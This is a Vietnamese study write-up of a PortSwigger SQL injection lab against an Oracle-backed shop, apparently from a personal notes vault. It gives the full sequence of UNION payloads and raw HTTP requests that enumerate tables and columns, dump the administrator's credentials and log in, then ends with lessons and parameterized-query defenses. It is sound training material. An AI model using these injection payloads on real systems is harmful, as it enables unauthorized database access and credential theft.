# Lab — SQL injection attack, listing the database contents on Oracle (SQLi / Practitioner)

-mô tả: lab shop chạy Oracle, filter `category` dính SQLi, query trả về 2 cột. Mình dùng UNION đọc data dictionary của Oracle (`all_tables`, `all_tab_columns`) để tìm bảng users, tìm 2 cột username/password, dump creds rồi login `administrator`.
![[Pasted image 20261020150650.png]]
> [!NOTE] đề nói gì
> - link lab: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
> - endpoint dính lỗi: `/filter?category=...`
> - mục tiêu: tìm tên bảng chứa user/pass + tên cột bên trong, dump lấy password của `administrator` rồi login.
> - hint của đề: Oracle bắt buộc mọi `SELECT` phải có `FROM`; khi select literal thì dùng bảng có sẵn `dual`, ví dụ `UNION SELECT 'abc' FROM dual`.
> - liên quan: [[các bước thu thập thông tin về csdl]], [[SQL cheet sheet]].

### quá trình suy nghĩ 

1. **quan sát:** `category=Gifts` → 200, ra danh sách sản phẩm. Thêm dấu `'` → 500 ngay → tham số ghép thẳng vào query, có SQLi.
2. **đếm cột:** mình tưởng query cũng 3 cột giống lab đếm cột trước đó, nhưng UI mỗi lab mỗi khác nên cứ đo bằng query cho chắc. `ORDER BY 1--` → 200, `2--` → 200, `3--` → 500 => query trả về **2 cột**. Bài học cũ vẫn đúng: lỗi ở `n` thì số cột là `n - 1`.
3. **tìm cột chứa text - dính bẫy Oracle ngay:** mình quen tay kiểu MySQL, viết `' UNION SELECT 'zqx123', NULL--` → **500**. Nghĩ lại thì đề đã hint: Oracle không cho `SELECT` mà không có `FROM`. Thêm `FROM dual` vào: `' UNION SELECT 'zqx123', NULL FROM dual--` → 200, `zqx123` hiện lên trang. Thử đổi sang cột 2: `' UNION SELECT NULL, 'zqx123' FROM dual--` → cũng 200 và marker hiện => **cả 2 cột đều là text**, tha hồ dump.
4. **liệt kê bảng:** Oracle có data dictionary, dùng `all_tables`:
   `' UNION SELECT table_name, NULL FROM all_tables WHERE table_name LIKE '%USERS%'--`
   -> ra đúng 2 dòng: `USERS_AND_ROLES` và `USERS_EUWZAS`.
5. **đoán hụt (lần này thật):** mình thử bảng đầu tiên `USERS_AND_ROLES` trước, query `all_tab_columns WHERE table_name='USERS_AND_ROLES'` → vẫn 200 nhưng **không có cột nào tên kiểu `USERNAME_%` / `PASSWORD_%`** => đây là bảng hệ thống/sample chứ không phải bảng của lab. Bảng lab luôn có đuôi random `USERS_XXXXXX`, nên chốt `USERS_EUWZAS`.
6. **liệt kê cột:** `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_EUWZAS'--`
   -> `USERNAME_ZTTHFI`, `PASSWORD_JIFDJY`.
7. **dump:** nối 2 cột bằng `||` (concat của Oracle) cho dễ đọc một dòng:
   `' UNION SELECT USERNAME_ZTTHFI || ':' || PASSWORD_JIFDJY, NULL FROM USERS_EUWZAS--`
   -> `administrator:l0haageen8afk08oe0o3`.
8. **kết quả:** login bằng `administrator` + password vừa dump → 302 sang `/my-account?id=administrator`, trang hiện "Your username is: administrator" và banner "Congratulations, you solved the lab!".

### hướng giải (checklist)

- [ ] chèn `'` vào `category` xác nhận lỗi SQL
- [ ] `ORDER BY 1->`, `2->`, ... đến khi 500 thì số cột = n - 1
- [ ] tìm cột text bằng `' UNION SELECT 'marker', NULL FROM dual--` (nhớ `FROM dual`)
- [ ] liệt kê bảng: `all_tables` + `WHERE table_name LIKE '%USERS%'`
- [ ] liệt kê cột: `all_tab_columns WHERE table_name='...'`
- [ ] dump creds (nối cột bằng `||`), login `administrator`

### giải

==xác nhận lỗi:==

```
GET /filter?category=Gifts' HTTP/1.1
-> 500
=> tham số category ghép thẳng vào query
```

==**đếm cột:**==

```
GET /filter?category=Gifts' ORDER BY 1-- HTTP/1.1
-> 200

GET /filter?category=Gifts' ORDER BY 2-- HTTP/1.1
-> 200

GET /filter?category=Gifts' ORDER BY 3-- HTTP/1.1
-> 500
=> query trả về đúng 2 cột
```
![[Pasted image 20261020152443.png]]
==tìm cột text,== và cái bẫy thiếu `FROM dual`:

```
GET /filter?category=Gifts' UNION SELECT 'zqx123', NULL-- HTTP/1.1
-> 500        (Oracle: SELECT nào cũng phải có FROM)

GET /filter?category=Gifts' UNION SELECT 'zqx123', NULL FROM dual-- HTTP/1.1
-> 200, thấy zqx123 trên trang

GET /filter?category=Gifts' UNION SELECT NULL, 'zqx123' FROM dual-- HTTP/1.1
-> 200, thấy zqx123 trên trang
=> cả 2 cột đều chứa text
```
![[Pasted image 20261020152735.png]]
==liệt kê bảng:==

```
GET /filter?category=Gifts' UNION SELECT table_name, NULL FROM all_tables WHERE table_name LIKE '%USERS%'-- HTTP/1.1
-> 200
USERS_AND_ROLES
USERS_EUWZAS
```

thử sai bảng trước (bảng hệ thống):

```
GET /filter?category=Gifts' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_AND_ROLES'-- HTTP/1.1
-> 200 nhưng không có cột USERNAME_* / PASSWORD_*
=> không phải bảng của lab
```

liệt kê cột của bảng thật:

```
GET /filter?category=Gifts' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_EUWZAS'-- HTTP/1.1
-> 200
USERNAME_ZTTHFI
PASSWORD_JIFDJY
```

dump creds:

```
GET /filter?category=Gifts' UNION SELECT USERNAME_ZTTHFI || ':' || PASSWORD_JIFDJY, NULL FROM USERS_EUWZAS-- HTTP/1.1
-> 200
administrator:l0haageen8afk08oe0o3
```

login:

```
GET /login HTTP/1.1
-> lấy csrf

POST /login HTTP/1.1
csrf=EzIK7wFHpUECHXJVAThVDJ9QQwV6hWuk&username=administrator&password=l0haageen8afk08oe0o3
-> 302 Location: /my-account?id=administrator
=> solved, banner "Congratulations, you solved the lab!"
```

### bài học

> [!NOTE]
> - Oracle khác MySQL/Postgres ở chỗ **mọi SELECT phải có FROM**; select literal thì `FROM dual`. Đây là lỗi mình dính đầu tiên khi chuyển từ MySQL sang.
> - Data dictionary là mỏ vàng khi đã có UNION: `all_tables` (danh sách bảng), `all_tab_columns` (danh sách cột). MySQL tương ứng `information_schema.tables/columns`.
> - `LIKE '%USERS%'` sẽ ra cả bảng hệ thống (`USERS_AND_ROLES`) — đừng thấy bảng đầu tiên là chốt, bảng của lab thường có đuôi random `USERS_XXXXXX`.
> - Oracle nối chuỗi bằng `||`, không phải `CONCAT()` nhiều tham số như MySQL.
> - Phân biệt 2 lab cùng mục Examining the database: bài này là **listing database contents** (phải tự tìm bảng/cột rồi dump). Còn lab **querying the database type and version on Oracle** chỉ cần `' UNION SELECT banner, NULL FROM v$version--` là xong.
> - defense: query tham số hoá (`PreparedStatement`) là gốc rễ; đừng hiển thị lỗi SQL ra ngoài (quote là 500 ngay); tài khoản DB chạy app nên least privilege.
> - liên quan: [[lys thuyet sql injection]], [[xác định số cột&kiểu dl]], [[các bước thu thập thông tin về csdl]], [[Lab-SQLi UNION determine columns]], [[Lab-SQLi UNION retrieve version and users]], [[Lab-Blind boolean conditional responses]]; câu hỏi phỏng vấn: [[tra loi pv chi tiet P1]].

![[Pasted image 20261020150347.png]]